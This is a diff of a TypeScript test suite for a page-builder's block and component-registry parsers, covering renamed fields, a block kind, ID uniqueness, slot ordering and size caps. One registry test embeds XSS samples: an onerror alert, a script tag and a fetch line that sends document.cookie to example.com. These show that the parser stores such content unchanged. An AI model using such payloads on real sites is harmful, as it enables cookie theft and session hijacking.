@@ -5,10 +5,20 @@ import {
   ApiBlockStyling,
   apiBlockStylingKeys,
   filterPuckBlocks,
+  isStoredPuckBlocks,
+  isStoredPuckRegistry,
+  MAX_PUCK_BLOCK_CONSUMES,
   MAX_PUCK_BLOCKS_DEPTH,
   MAX_PUCK_BLOCKS_LENGTH,
+  MAX_PUCK_REGISTRY_COMPONENTS,
+  MAX_PUCK_SCRIPT_LENGTH,
+  orderPuckChildren,
   parsePuckBlocks,
+  parsePuckDocument,
+  parsePuckRegistry,
   PuckBlocksError,
+  readStoredPuckBlocks,
+  readStoredPuckRegistry,
 } from './puck-blocks';
 
 const block = (
@@ -17,8 +27,9 @@ const block = (
   extra: Partial<ApiBlock> = {}
 ): ApiBlock => ({
   id,
+  kind: 'puck',
   type: 'Heading',
-  data: props,
+  props,
   ...extra,
 });
 
@@ -79,8 +90,12 @@ describe('parsePuckBlocks', () => {
             userSubscription: { type: 'uniqueList' },
           },
           children: [
-            block('heading-1', { text: 'Hello' }, { slot: 'items[0].content' }),
-            block('heading-2', {}, { slot: 'items[1].content' }),
+            block(
+              'heading-1',
+              { text: 'Hello' },
+              { puckSlot: 'items[0].content' }
+            ),
+            block('heading-2', {}, { puckSlot: 'items[1].content' }),
           ],
         }
       ),
@@ -94,13 +109,29 @@ describe('parsePuckBlocks', () => {
     expect(parsePuckBlocks([])).toEqual([]);
   });
 
-  it('accepts a component prop named type inside the data', () => {
+  it('keeps how many records a block consumes itself from its own lists', () => {
+    const blocks = [
+      block(
+        'events-1',
+        {},
+        {
+          datasources: { event: { type: 'list' } },
+          consumes: MAX_PUCK_BLOCK_CONSUMES,
+        }
+      ),
+      block('events-2', {}, { consumes: 1 }),
+    ];
+
+    expect(parsePuckBlocks(blocks)).toEqual(blocks);
+  });
+
+  it('accepts a component prop named type inside the props', () => {
     const blocks = [block('input-1', { type: 'email', name: 'EMAIL' })];
 
     expect(parsePuckBlocks(blocks)).toEqual(blocks);
   });
 
-  it('keeps null props inside the data', () => {
+  it('keeps null props inside the props', () => {
     const blocks = [block('text-1', { text: null })];
 
     expect(parsePuckBlocks(blocks)).toEqual(blocks);
@@ -151,10 +182,11 @@ describe('parsePuckBlocks', () => {
       parsePuckBlocks([
         {
           id: 'a',
+          kind: 'puck',
           type: 'Grid',
-          data: {},
+          props: {},
           locked: null,
-          slot: null,
+          puckSlot: null,
           styling: { color: null, margin: { top: 1, left: null } },
           datasources: {
             article: null,
@@ -171,8 +203,9 @@ describe('parsePuckBlocks', () => {
     ).toEqual([
       {
         id: 'a',
+        kind: 'puck',
         type: 'Grid',
-        data: {},
+        props: {},
         styling: { margin: { top: 1 } },
         datasources: { page: { type: 'single', id: 'page-1' } },
         visibility: { timings: {} },
@@ -192,32 +225,47 @@ describe('parsePuckBlocks', () => {
     [
       'a puck component',
       [{ type: 'Heading', props: { id: 'a' } }],
-      'blocks[0].id is required',
+      'blocks[0].kind must be one of puck, generated',
+    ],
+    [
+      'a block without a kind',
+      [{ id: 'a', type: 'Heading', props: {} }],
+      'blocks[0].kind must be one of puck, generated',
+    ],
+    [
+      'an unknown kind',
+      [{ ...block('a'), kind: 'legacy' }],
+      'blocks[0].kind must be one of puck, generated',
     ],
     [
       'a block without a type',
-      [{ id: 'a', data: { text: 'Hello' } }],
+      [{ id: 'a', kind: 'puck', props: { text: 'Hello' } }],
       'blocks[0].type is required',
     ],
     [
       'a type that is not a string',
-      [{ id: 'a', type: 1, data: {} }],
+      [{ id: 'a', kind: 'puck', type: 1, props: {} }],
       'blocks[0].type must be a string',
     ],
     [
-      'a block without data',
-      [{ id: 'a', type: 'Heading' }],
-      'blocks[0].data is required',
+      'a block without props',
+      [{ id: 'a', kind: 'puck', type: 'Heading' }],
+      'blocks[0].props is required',
     ],
     [
-      'data that is a list',
-      [{ id: 'a', type: 'Heading', data: [] }],
-      'blocks[0].data must be an object',
+      'props that are a list',
+      [{ id: 'a', kind: 'generated', type: 'Hero', props: [] }],
+      'blocks[0].props must be an object',
     ],
     [
-      'an unknown block key',
-      [{ ...block('a'), props: {} }],
-      'blocks[0] must not have props',
+      'the props stored as data',
+      [{ ...block('a'), data: {} }],
+      'blocks[0] must not have data',
+    ],
+    [
+      'the slot stored as slot',
+      [{ ...block('a'), slot: 'content' }],
+      'blocks[0] must not have slot',
     ],
     [
       'a lock that is not a boolean',
@@ -241,8 +289,28 @@ describe('parsePuckBlocks', () => {
     ],
     [
       'a slot that is not a string',
-      [{ ...block('a'), slot: 1 }],
-      'blocks[0].slot must be a string',
+      [{ ...block('a'), puckSlot: 1 }],
+      'blocks[0].puckSlot must be a string',
+    ],
+    [
+      'consumed records that are not a number',
+      [{ ...block('a'), consumes: '6' }],
+      'blocks[0].consumes must be a number',
+    ],
+    [
+      'a fraction of a consumed record',
+      [{ ...block('a'), consumes: 1.5 }],
+      'blocks[0].consumes must be an integer',
+    ],
+    [
+      'no consumed records',
+      [{ ...block('a'), consumes: 0 }],
+      'blocks[0].consumes must be at least 1',
+    ],
+    [
+      'more consumed records than the cap',
+      [{ ...block('a'), consumes: MAX_PUCK_BLOCK_CONSUMES + 1 }],
+      `blocks[0].consumes must be at most ${MAX_PUCK_BLOCK_CONSUMES}`,
     ],
     [
       'children that are not a list',
@@ -254,25 +322,25 @@ describe('parsePuckBlocks', () => {
       [
         {
           ...block('a'),
-          children: [block('b'), { type: 'Heading', data: {} }],
+          children: [block('b'), { kind: 'puck', type: 'Heading', props: {} }],
         },
       ],
       'blocks[0].children[1].id is required',
     ],
     ['an empty id', [block('')], 'blocks[0].id must not be empty'],
     [
-      'a component inside the data',
+      'a component inside the props',
       [
         block('a', {
           items: [{ content: [{ type: 'Text', props: { id: 't' } }] }],
         }),
       ],
-      'blocks[0].data.items[0].content[0] must not be a component, nest it through children',
+      'blocks[0].props.items[0].content[0] must not be a component, nest it through children',
     ],
     [
-      'block fields inside the data',
+      'block fields inside the props',
       [block('a', { visibility: { disabled: true } })],
-      'blocks[0].data.visibility belongs on the block, not inside its data',
+      'blocks[0].props.visibility belongs on the block, not inside its props',
     ],
     [
       'a timing that is not a date',
@@ -395,14 +463,52 @@ describe('parsePuckBlocks', () => {
       'blocks[0].datasources.page must not have data',
     ],
     [
+      'a list datasource that limits how many it loads',
+      [{ ...block('a'), datasources: { article: { type: 'list', take: 3 } } }],
+      'blocks[0].datasources.article must not have take',
+    ],
+    [
+      'an image datasource loading the latest images',
+      [{ ...block('a'), datasources: { image: { type: 'list' } } }],
+      'blocks[0].datasources.image.type must be one of single, multiple',
+    ],
+    [
+      'an image datasource without duplicates',
+      [{ ...block('a'), datasources: { image: { type: 'uniqueList' } } }],
+      'blocks[0].datasources.image.type must be one of single, multiple',
+    ],
+    [
+      'an image datasource taken from the parent',
+      [{ ...block('a'), datasources: { image: { type: 'slot' } } }],
+      'blocks[0].datasources.image.type must be one of single, multiple',
+    ],
+    [
+      'two blocks with the same id',
+      [block('a'), block('b'), block('a')],
+      'blocks[2].id must be unique in the document',
+    ],
+    [
+      'a child with the id of its parent',
+      [block('a', {}, { children: [block('b'), block('a')] })],
+      'blocks[0].children[1].id must be unique in the document',
+    ],
+    [
+      'children of different parents with the same id',
+      [
+        block('a', {}, { children: [block('c')] }),
+        block('b', {}, { children: [block('c')] }),
+      ],
+      'blocks[1].children[0].id must be unique in the document',
+    ],
+    [
       'an unknown datasource model',
       [{ ...block('a'), datasources: { author: { type: 'list' } } }],
       'blocks[0].datasources must not have author',
     ],
     [
       'a huge slot index',
-      [{ ...block('a'), slot: 'items[4294967294].content' }],
-      'blocks[0].slot must be a slot path like items[0].content',
+      [{ ...block('a'), puckSlot: 'items[4294967294].content' }],
+      'blocks[0].puckSlot must be a slot path like items[0].content',
     ],
     [
       'a colour that is neither a theme colour nor hex',
@@ -528,8 +634,9 @@ describe('apiBlockStylingKeys', () => {
 
 const storedBlock = (extra: Record<string, unknown> = {}) => ({
   id: 'Title-1',
+  kind: 'puck',
   type: 'Title',
-  data: {},
+  props: {},
   ...extra,
 });
 
@@ -563,8 +670,8 @@ const sourced = (datasources: unknown) => [storedBlock({ datasources })];
 
 const styled = (styling: unknown) => [storedBlock({ styling })];
 
-const slotted = (slot: unknown) => [
-  storedBlock({ children: [storedBlock({ id: 'Title-2', slot })] }),
+const slotted = (puckSlot: unknown) => [
+  storedBlock({ children: [storedBlock({ id: 'Title-2', puckSlot })] }),
 ];
 
 const storedBlockFormat: Record<'valid' | 'invalid', [string, unknown][]> = {
@@ -573,25 +680,32 @@ const storedBlockFormat: Record<'valid' | 'invalid', [string, unknown][]> = {
     ['a block', [storedBlock()]],
     [
       'locked and unlocked blocks',
-      [storedBlock({ locked: true }), storedBlock({ locked: false })],
+      [
+        storedBlock({ locked: true }),
+        storedBlock({ id: 'Title-2', locked: false }),
+      ],
     ],
     [
-      'a type prop inside the data',
-      [storedBlock({ data: { type: 'submit' } })],
+      'a generated block',
+      [storedBlock({ kind: 'generated', type: 'HeroBanner' })],
     ],
     [
-      'rich text nodes inside the data',
+      'a type prop inside the props',
+      [storedBlock({ props: { type: 'submit' } })],
+    ],
+    [
+      'rich text nodes inside the props',
       [
         storedBlock({
-          data: {
+          props: {
             richText: [{ type: 'paragraph', children: [{ text: 'Hi' }] }],
           },
         }),
       ],
     ],
     [
-      'empty slots inside the data',
-      [storedBlock({ data: { items: [{ content: [] }], content: [] } })],
+      'empty slots inside the props',
+      [storedBlock({ props: { items: [{ content: [] }], content: [] } })],
     ],
     ['an empty visibility', [storedBlock({ visibility: {} })]],
     [
@@ -676,6 +790,16 @@ const storedBlockFormat: Record<'valid' | 'invalid', [string, unknown][]> = {
       'a child in the content slot',
       [storedBlock({ children: [storedBlock({ id: 'Title-2' })] })],
     ],
+    [
+      'a child in the slot of a generated block',
+      [
+        storedBlock({
+          kind: 'generated',
+          type: 'HeroBanner',
+          children: [storedBlock({ id: 'Title-2', puckSlot: 'hero.body' })],
+        }),
+      ],
+    ],
     ['a child in a named slot', slotted('items[0].content')],
     ['a child at the highest slot index', slotted('items[999].content')],
     ['a child in a nested slot', slotted('layout.columns[1][2].content')],
@@ -701,39 +825,62 @@ const storedBlockFormat: Record<'valid' | 'invalid', [string, unknown][]> = {
     ['an empty id', [storedBlock({ id: '' })]],
     ['an id that is not a string', [storedBlock({ id: 1 })]],
     ['an empty type', [storedBlock({ type: '' })]],
-    ['a block without a type', [{ id: 'Title-1', data: {} }]],
-    ['the type inside the data', [{ id: 'Title-1', data: { type: 'Title' } }]],
-    ['a block without data', [{ id: 'Title-1', type: 'Title' }]],
-    ['data that is a list', [storedBlock({ data: [] })]],
+    ['a block without a kind', [{ id: 'Title-1', type: 'Title', props: {} }]],
+    ['an unknown kind', [storedBlock({ kind: 'Title' })]],
+    ['a kind that is not a string', [storedBlock({ kind: 1 })]],
+    ['a block without a type', [{ id: 'Title-1', kind: 'puck', props: {} }]],
+    [
+      'the type inside the props',
+      [{ id: 'Title-1', kind: 'puck', props: { type: 'Title' } }],
+    ],
+    ['a block without props', [{ id: 'Title-1', kind: 'puck', type: 'Title' }]],
+    ['props that are a list', [storedBlock({ props: [] })]],
+    ['the props stored as data', [storedBlock({ data: {} })]],
+    [
+      'the slot stored as slot',
+      [storedBlock({ children: [storedBlock({ id: 'Title-2', slot: 'a' })] })],
+    ],
     ['an unknown block key', [storedBlock({ zones: {} })]],
-    ['a lock that is not a boolean', [storedBlock({ locked: 'yes' })]],
     [
-      'a component inside the data',
-      [storedBlock({ data: { content: [storedComponent] } })],
+      'two blocks with the same id',
+      [storedBlock(), storedBlock({ id: 'Title-2' }), storedBlock()],
     ],
     [
-      'a component next to other items inside the data',
-      [storedBlock({ data: { content: [{}, storedComponent] } })],
-    ],
-    [
-      'a component deep inside the data',
+      'a grandchild with the id of the root',
       [
         storedBlock({
-          data: { items: [{ card: { teaser: storedComponent } }] },
+          children: [storedBlock({ id: 'Title-2', children: [storedBlock()] })],
         }),
       ],
     ],
-    ['the id inside the data', [storedBlock({ data: { id: 'Title-1' } })]],
-    ['the lock inside the data', [storedBlock({ data: { locked: true } })]],
+    ['a lock that is not a boolean', [storedBlock({ locked: 'yes' })]],
     [
-      'the visibility inside the data',
-      [storedBlock({ data: { visibility: {} } })],
+      'a component inside the props',
+      [storedBlock({ props: { content: [storedComponent] } })],
     ],
     [
-      'datasources inside the data',
-      [storedBlock({ data: { datasources: {} } })],
+      'a component next to other items inside the props',
+      [storedBlock({ props: { content: [{}, storedComponent] } })],
     ],
-    ['styling inside the data', [storedBlock({ data: { styling: {} } })]],
+    [
+      'a component deep inside the props',
+      [
+        storedBlock({
+          props: { items: [{ card: { teaser: storedComponent } }] },
+        }),
+      ],
+    ],
+    ['the id inside the props', [storedBlock({ props: { id: 'Title-1' } })]],
+    ['the lock inside the props', [storedBlock({ props: { locked: true } })]],
+    [
+      'the visibility inside the props',
+      [storedBlock({ props: { visibility: {} } })],
+    ],
+    [
+      'datasources inside the props',
+      [storedBlock({ props: { datasources: {} } })],
+    ],
+    ['styling inside the props', [storedBlock({ props: { styling: {} } })]],
     ['a visibility that is a list', [storedBlock({ visibility: [] })]],
     [
       'a disabled flag that is not a boolean',
@@ -812,6 +959,22 @@ const storedBlockFormat: Record<'valid' | 'invalid', [string, unknown][]> = {
     [
       'a list datasource with an id',
       sourced({ article: { type: 'uniqueList', id: 'article-1' } }),
+    ],
+    [
+      'a list datasource that limits how many it loads',
+      sourced({ page: { type: 'uniqueList', take: 2 } }),
+    ],
+    [
+      'an image datasource of the latest images',
+      sourced({ image: { type: 'list' } }),
+    ],
+    [
+      'an image datasource without duplicates',
+      sourced({ image: { type: 'uniqueList' } }),
+    ],
+    [
+      'an image datasource from the parent',
+      sourced({ image: { type: 'slot' } }),
     ],
     [
       'a user subscription datasource that picks records',
@@ -900,7 +1063,7 @@ const storedBlockFormat: Record<'valid' | 'invalid', [string, unknown][]> = {
         storedBlock({
           children: [
             storedBlock({ id: 'Title-2' }),
-            { type: 'Title', data: {} },
+            { kind: 'puck', type: 'Title', props: {} },
           ],
         }),
       ],
@@ -932,14 +1095,14 @@ describe('filterPuckBlocks', () => {
   const hidden = (id: string, extra: Partial<ApiBlock> = {}) =>
     block(id, { hidden: true }, extra);
 
-  const keepVisible = (entry: ApiBlock) => !entry.data['hidden'];
+  const keepVisible = (entry: ApiBlock) => !entry.props['hidden'];
 
   it('returns the same blocks when every block is kept', () => {
     const blocks = [
       block(
         'a',
         { content: [] },
-        { children: [block('b', {}, { slot: 'content' })] }
+        { children: [block('b', {}, { puckSlot: 'content' })] }
       ),
       block('c'),
     ];
@@ -1002,5 +1165,559 @@ describe('filterPuckBlocks', () => {
     ];
 
     expect(filterPuckBlocks(blocks, keepVisible)).toBe(blocks);
+  });
+});
+
+describe('the order of stored children', () => {
+  const slotted = (id: string, puckSlot?: string) =>
+    block(id, {}, puckSlot ? { puckSlot } : {});
+
+  const childIds = (blocks: ApiBlock[]) =>
+    blocks.map(({ id, children }) => [id, children?.map(child => child.id)]);
+
+  it('groups the children by slot in the order the slots first appear', () => {
+    const [grid] = parsePuckBlocks([
+      block(
+        'grid',
+        {},
+        {
+          children: [
+            slotted('a', 'items[1].content'),
+            slotted('b', 'items[0].content'),
+            slotted('c', 'items[1].content'),
+            slotted('d'),
+            slotted('e', 'items[0].content'),
+            slotted('f', 'content'),
+          ],
+        }
+      ),
+    ]);
+
+    expect(grid.children?.map(({ id }) => id)).toEqual([
+      'a',
+      'c',
+      'b',
+      'e',
+      'd',
+      'f',
+    ]);
+  });
+
+  it('groups the children of children too', () => {
+    const blocks = parsePuckBlocks([
+      block(
+        'outer',
+        {},
+        {
+          children: [
+            block(
+              'inner',
+              {},
+              {
+                children: [
+                  slotted('x', 'left'),
+                  slotted('y', 'right'),
+                  slotted('z', 'left'),
+                ],
+              }
+            ),
+          ],
+        }
+      ),
+    ]);
+
+    expect(blocks[0].children?.[0].children?.map(({ id }) => id)).toEqual([
+      'x',
+      'z',
+      'y',
+    ]);
+  });
+
+  it('keeps the top level in the order it was given', () => {
+    expect(
+      childIds(
+        parsePuckBlocks([slotted('a', 'side'), slotted('b'), slotted('c')])
+      )
+    ).toEqual([
+      ['a', undefined],
+      ['b', undefined],
+      ['c', undefined],
+    ]);
+  });
+});
+
+describe('orderPuckChildren', () => {
+  it('groups by slot in order of first appearance and keeps the order inside a slot', () => {
+    const children = [
+      { id: 'a', puckSlot: 'right' },
+      { id: 'b' },
+      { id: 'c', puckSlot: 'right' },
+      { id: 'd', puckSlot: 'content' },
+      { id: 'e', puckSlot: 'left' },
+    ];
+
+    expect(orderPuckChildren(children).map(({ id }) => id)).toEqual([
+      'a',
+      'c',
+      'b',
+      'd',
+      'e',
+    ]);
+  });
+
+  it('leaves the children it was given alone', () => {
+    const children = [
+      { id: 'a', puckSlot: 'right' },
+      { id: 'b', puckSlot: 'left' },
+      { id: 'c', puckSlot: 'right' },
+    ];
+
+    orderPuckChildren(children);
+
+    expect(children.map(({ id }) => id)).toEqual(['a', 'b', 'c']);
+  });
+
+  it('orders nothing to nothing', () => {
+    expect(orderPuckChildren([])).toEqual([]);
+  });
+});
+
+const heroBanner = {
+  label: 'Hero banner',
+  html: '<section class="hero"><h1 data-puck-field-name="title">Hello</h1><div data-puck-slot="content"></div></section>',
+  styles: '.hero { padding: 2rem; }',
+  script:
+    'document.querySelectorAll(".hero").forEach(hero => hero.classList.add("ready"));',
+  fields: { title: { type: 'text' }, content: { type: 'slot' } },
+  defaultProps: { title: 'Hello' },
+};
+
+const puckRegistry = (extra: Record<string, unknown> = {}) => ({
+  components: { HeroBanner: heroBanner },
+  styles: ':root { --accent: #ff0055; }',
+  script: 'window.dispatchEvent(new Event("designed"));',
+  ...extra,
+});
+
+const generated = (
+  id: string,
+  type = 'HeroBanner',
+  extra: Partial<ApiBlock> = {}
+): ApiBlock => ({ id, kind: 'generated', type, props: {}, ...extra });
+
+describe('parsePuckRegistry', () => {
+  it('stores the registry exactly as Puck AI keeps it, scripts included', () => {
+    expect(parsePuckRegistry(puckRegistry())).toEqual(puckRegistry());
+  });
+
+  it('accepts a registry without components', () => {
+    expect(parsePuckRegistry({ components: {} })).toEqual({ components: {} });
+  });
+
+  it('accepts a component that is only markup', () => {
+    expect(parsePuckRegistry({ components: { Empty: { html: '' } } })).toEqual({
+      components: { Empty: { html: '' } },
+    });
+  });
+
+  it('never looks inside the markup, styles or script', () => {
+    const registry = puckRegistry({
+      components: {
+        Unsafe: {
+          html: '<img src="x" onerror="alert(1)"><script>alert(2)</script>',
+          styles: 'body { background: url(https://example.com/x.png) }',
+          script: 'fetch("https://example.com/" + document.cookie)',
+        },
+      },
+    });
+
+    expect(parsePuckRegistry(registry)).toEqual(registry);
+  });
+
+  it('keeps a component Puck AI is still streaming', () => {
+    const registry = puckRegistry({
+      components: { HeroBanner: { html: '<section><h1', streaming: true } },
+    });
+
+    expect(parsePuckRegistry(registry)).toEqual(registry);
+  });
+
+  it('passes on the component keys it does not know', () => {
+    const registry = puckRegistry({
+      components: {
+        HeroBanner: {
+          ...heroBanner,
+          version: 2,
+          resolveData: { from: 'title' },
+        },
+      },
+    });
+
+    expect(parsePuckRegistry(registry)).toEqual(registry);
+  });
+
+  it('drops the values a GraphQL client sent as null', () => {
+    expect(
+      parsePuckRegistry({
+        components: { HeroBanner: { html: '<p></p>', label: null } },
+        styles: null,
+        script: null,
+      })
+    ).toEqual({ components: { HeroBanner: { html: '<p></p>' } } });
+  });
+
+  it('accepts a script as long as the cap', () => {
+    const script = 'x'.repeat(MAX_PUCK_SCRIPT_LENGTH);
+
+    expect(parsePuckRegistry(puckRegistry({ script })).script).toBe(script);
+  });
+
+  it('throws a bad request for an invalid registry', () => {
+    expect(() => parsePuckRegistry(null)).toThrow(BadRequestException);
+    expect(() => parsePuckRegistry(null)).toThrow(PuckBlocksError);
+  });
+
+  it.each([
+    ['null', null, 'registry must be an object'],
+    ['a list', [], 'registry must be an object'],
+    ['no components', { styles: '' }, 'registry.components is required'],
+    [
+      'components as a list',
+      { components: [{ name: 'HeroBanner', ...heroBanner }] },
+      'registry.components must be an object',
+    ],
+    [
+      'a component that is not an object',
+      { components: { HeroBanner: '<p></p>' } },
+      'registry.components.HeroBanner must be an object',
+    ],
+    [
+      'a component without markup',
+      { components: { HeroBanner: { label: 'Hero' } } },
+      'registry.components.HeroBanner.html is required',
+    ],
+    [
+      'markup that is not a string',
+      { components: { HeroBanner: { html: ['<p></p>'] } } },
+      'registry.components.HeroBanner.html must be a string',
+    ],
+    [
+      'a label that is not a string',
+      { components: { HeroBanner: { html: '', label: 1 } } },
+      'registry.components.HeroBanner.label must be a string',
+    ],
+    [
+      'component styles that are not a string',
+      { components: { HeroBanner: { html: '', styles: {} } } },
+      'registry.components.HeroBanner.styles must be a string',
+    ],
+    [
+      'fields that are not an object',
+      { components: { HeroBanner: { html: '', fields: [] } } },
+      'registry.components.HeroBanner.fields must be an object',
+    ],
+    [
+      'a field that is null',
+      { components: { HeroBanner: { html: '', fields: { title: null } } } },
+      'registry.components.HeroBanner.fields.title must be an object',
+    ],
+    [
+      'a field that is not an object',
+      { components: { HeroBanner: { html: '', fields: { title: 'text' } } } },
+      'registry.components.HeroBanner.fields.title must be an object',
+    ],
+    [
+      'a field that is a list',
+      {
+        components: {
+          HeroBanner: { html: '', fields: { title: [{ type: 'text' }] } },
+        },
+      },
+      'registry.components.HeroBanner.fields.title must be an object',
+    ],
+    [
+      'default props that are not an object',
+      { components: { HeroBanner: { html: '', defaultProps: 'title' } } },
+      'registry.components.HeroBanner.defaultProps must be an object',
+    ],
+    [
+      'a streaming flag that is not a boolean',
+      { components: { HeroBanner: { html: '<p', streaming: 'yes' } } },
+      'registry.components.HeroBanner.streaming must be a boolean',
+    ],
+    [
+      'a component script longer than the cap',
+      {
+        components: {
+          HeroBanner: {
+            html: '',
+            script: 'x'.repeat(MAX_PUCK_SCRIPT_LENGTH + 1),
+          },
+        },
+      },
+      `registry.components.HeroBanner.script must be at most ${MAX_PUCK_SCRIPT_LENGTH} characters`,
+    ],
+    [
+      'a script that is not a string',
+      { components: {}, script: () => undefined },
+      'registry.script must be a string',
+    ],
+    [
+      'a script longer than the cap',
+      { components: {}, script: 'x'.repeat(MAX_PUCK_SCRIPT_LENGTH + 1) },
+      `registry.script must be at most ${MAX_PUCK_SCRIPT_LENGTH} characters`,
+    ],
+    [
+      'styles that are not a string',
+      { components: {}, styles: 1 },
+      'registry.styles must be a string',
+    ],
+    [
+      'an unknown registry key',
+      { components: {}, version: 2 },
+      'registry must not have version',
+    ],
+    [
+      'a component without a name',
+      { components: { '': { html: '' } } },
+      'registry.components must name every component with 1 to 100 characters',
+    ],
+    [
+      'a component name longer than 100 characters',
+      { components: { ['A'.repeat(101)]: { html: '' } } },
+      'registry.components must name every component with 1 to 100 characters',
+    ],
+    [
+      'more components than the cap',
+      {
+        components: Object.fromEntries(
+          Array.from(
+            { length: MAX_PUCK_REGISTRY_COMPONENTS + 1 },
+            (_, index) => [`Component${index}`, { html: '' }]
+          )
+        ),
+      },
+      `registry.components must have at most ${MAX_PUCK_REGISTRY_COMPONENTS} components`,
+    ],
+  ])('rejects %s', (_, value, message) => {
+    expect(() => parsePuckRegistry(value)).toThrow(
+      `Puck registry is invalid: ${message}.`
+    );
+  });
+
+  it('rejects a registry larger than the size cap', () => {
+    const registry = {
+      components: {
+        HeroBanner: { html: 'x'.repeat(MAX_PUCK_BLOCKS_LENGTH) },
+      },
+    };
+
+    expect(() => parsePuckRegistry(registry)).toThrow(
+      'Puck registry is too large'
+    );
+  });
+});
+
+describe('parsePuckDocument', () => {
+  it('parses the blocks and the registry together', () => {
+    const blocks = [generated('hero-1'), block('heading-1')];
+
+    expect(parsePuckDocument({ blocks, registry: puckRegistry() })).toEqual({
+      blocks,
+      registry: puckRegistry(),
+    });
+  });
+
+  it.each([null, undefined])('has no registry when it is %s', registry => {
+    expect(parsePuckDocument({ blocks: [block('a')], registry })).toEqual({
+      blocks: [block('a')],
+      registry: null,
+    });
+  });
+
+  it('accepts generated blocks the registry declares, however deep they sit', () => {
+    const blocks = [
+      block(
+        'grid-1',
+        {},
+        {
+          children: [
+            generated('hero-1', 'HeroBanner', {
+              children: [
+                generated('hero-2', 'HeroBanner', { puckSlot: 'content' }),
+              ],
+            }),
+          ],
+        }
+      ),
+    ];
+
+    expect(
+      parsePuckDocument({ blocks, registry: puckRegistry() }).blocks
+    ).toEqual(blocks);
+  });
+
+  it('never looks puck blocks up in the registry', () => {
+    const blocks = [block('a', {}, { type: 'NotGenerated' })];
+
+    expect(parsePuckDocument({ blocks, registry: null }).blocks).toEqual(
+      blocks
+    );
+  });
+
+  it.each([
+    [
+      'a generated block without a registry',
+      [block('a'), generated('hero-1')],
+      null,
+      'blocks[1].type must name a generated component of the registry',
+    ],
+    [
+      'a generated block the registry does not declare',
+      [generated('hero-1', 'Teaser')],
+      puckRegistry(),
+      'blocks[0].type must name a generated component of the registry',
+    ],
+    [
+      'a nested generated block the registry does not declare',
+      [
+        block(
+          'grid-1',
+          {},
+          { children: [block('b'), generated('hero-1', 'Footer')] }
+        ),
+      ],
+      puckRegistry(),
+      'blocks[0].children[1].type must name a generated component of the registry',
+    ],
+    [
+      'a generated block named after an object property',
+      [generated('hero-1', 'constructor')],
+      puckRegistry(),
+      'blocks[0].type must name a generated component of the registry',
+    ],
+  ])('rejects %s', (_, blocks, registry, message) => {
+    expect(() => parsePuckDocument({ blocks, registry })).toThrow(
+      `Puck blocks are invalid: ${message}.`
+    );
+  });
+
+  it('reports invalid blocks before an invalid registry', () => {
+    expect(() =>
+      parsePuckDocument({ blocks: [{ id: 'a' }], registry: { components: [] } })
+    ).toThrow('Puck blocks are invalid: blocks[0].kind');
+  });
+
+  it('reports an invalid registry', () => {
+    expect(() =>
+      parsePuckDocument({ blocks: [], registry: { components: [] } })
+    ).toThrow(
+      'Puck registry is invalid: registry.components must be an object.'
+    );
+  });
+});
+
+describe('isStoredPuckBlocks', () => {
+  it.each([
+    ['an empty list', []],
+    ['puck and generated blocks', [block('a'), generated('b')]],
+    [
+      'children that are not grouped by slot yet',
+      [
+        block(
+          'grid',
+          {},
+          {
+            children: [
+              block('a', {}, { puckSlot: 'right' }),
+              block('b', {}, { puckSlot: 'left' }),
+              block('c', {}, { puckSlot: 'right' }),
+            ],
+          }
+        ),
+      ],
+    ],
+  ])('accepts %s', (_, json) => {
+    expect(isStoredPuckBlocks(json)).toBe(true);
+  });
+
+  it.each([
+    ['null', null],
+    ['puck data', { root: {}, content: [] }],
+    [
+      'blocks stored before the envelope had a kind',
+      [{ id: 'a', type: 'Heading', data: {}, slot: 'content' }],
+    ],
+    ['duplicate ids', [block('a'), block('a')]],
+    ['blocks nested too deep', chain(MAX_PUCK_BLOCKS_DEPTH + 1)],
+  ])('refuses %s without throwing', (_, json) => {
+    expect(isStoredPuckBlocks(json)).toBe(false);
+  });
+});
+
+describe('isStoredPuckRegistry', () => {
+  it('accepts a registry as Puck AI keeps it', () => {
+    expect(isStoredPuckRegistry(puckRegistry())).toBe(true);
+  });
+
+  it.each([
+    ['null', null],
+    ['components as a list', { components: [] }],
+    ['a component without markup', { components: { HeroBanner: {} } }],
+  ])('refuses %s without throwing', (_, json) => {
+    expect(isStoredPuckRegistry(json)).toBe(false);
+  });
+});
+
+describe('readStoredPuckBlocks', () => {
+  it('reads stored blocks normalised like a fresh save', () => {
+    expect(
+      readStoredPuckBlocks([
+        {
+          ...block('grid'),
+          locked: null,
+          children: [
+            block('a', {}, { puckSlot: 'right' }),
+            { ...block('b', {}, { puckSlot: 'left' }), children: null },
+            block('c', {}, { puckSlot: 'right' }),
+          ],
+        },
+      ])
+    ).toEqual([
+      block(
+        'grid',
+        {},
+        {
+          children: [
+            block('a', {}, { puckSlot: 'right' }),
+            block('c', {}, { puckSlot: 'right' }),
+            block('b', {}, { puckSlot: 'left' }),
+          ],
+        }
+      ),
+    ]);
+  });
+
+  it.each([
+    ['null', null],
+    [
+      'blocks stored before the envelope had a kind',
+      [{ id: 'a', type: 'Heading', data: {}, slot: 'content' }],
+    ],
+    ['blocks nested too deep', chain(MAX_PUCK_BLOCKS_DEPTH + 1)],
+  ])('reads %s as none', (_, json) => {
+    expect(readStoredPuckBlocks(json)).toBeNull();
+  });
+});
+
+describe('readStoredPuckRegistry', () => {
+  it('reads a stored registry without its null entries', () => {
+    expect(readStoredPuckRegistry({ ...puckRegistry(), styles: null })).toEqual(
+      { ...puckRegistry(), styles: undefined }
+    );
+  });
+
+  it('reads a registry it cannot parse as none', () => {
+    expect(readStoredPuckRegistry({ components: [] })).toBeNull();
   });
 });
